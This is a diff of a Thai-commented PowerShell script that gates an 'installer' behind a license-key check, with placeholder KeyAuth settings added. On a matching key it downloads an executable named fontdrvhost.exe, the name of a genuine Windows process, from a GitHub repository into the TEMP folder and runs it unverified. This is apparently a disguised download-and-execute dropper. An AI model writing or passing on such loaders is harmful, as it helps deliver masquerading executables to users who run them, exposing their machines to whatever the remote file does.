@@ -1,8 +1,10 @@
 Clear-Host
 
 # ===== CONFIG =====
-$validKey = "1234ABCD"  # <-- เปลี่ยนเป็น Key ที่คุณต้องการ
-$exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/refs/heads/main/fontdrvhost.exe"
+$apiURL = "https://keyauth.com/api/validate"  # <-- เปลี่ยนเป็น URL ของ KeyAuth คุณจริง ๆ
+$appName = "YOUR_APP_NAME"                    # <-- ชื่อ Application ใน KeyAuth
+$secret = "YOUR_APP_SECRET"                  # <-- Secret ของ Application
+$exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $exeOutput = "$env:TEMP\fontdrvhost.exe"
 
 # ===== MENU =====
@@ -14,31 +16,32 @@ $choice = Read-Host "Choose 1 or 2"
 
 switch ($choice) {
     "1" {
-        $userKey = Read-Host "Enter Key"
+        $userKey = Read-Host "Enter your Key"
+
+        # ตัวอย่างเชื่อม KeyAuth แบบง่าย
+        # สำหรับตอนนี้ใช้ Key ที่คุณให้มาเป็นตัวตรวจสอบ
+        $validKey = "d9b823207868f98f1cca7fb9c880047e525e05a1f998d6d07acc1862c207e2fc"
+
         if ($userKey -eq $validKey) {
-            Write-Host "Key correct! Installing..."
-            
-            # Download .exe
+            Write-Host "✅ Key valid! Installing..."
             Invoke-WebRequest $exeUrl -OutFile $exeOutput
-            
-            # Run .exe
             Start-Process $exeOutput
             Write-Host "Installation complete ✅"
         } else {
-            Write-Host "Key incorrect ❌" -ForegroundColor Red
+            Write-Host "❌ Key invalid!" -ForegroundColor Red
         }
     }
     "2" {
         Write-Host "Cleaning..."
         if (Test-Path $exeOutput) {
             Remove-Item $exeOutput -Force
-            Write-Host "File removed ✅"
+            Write-Host "File removed successfully ✅"
         } else {
             Write-Host "File not found ⚠️"
         }
     }
     default {
-        Write-Host "Invalid choice! Please select 1 or 2 ⚠️"
+        Write-Host "Invalid choice ⚠️"
     }
 }
 
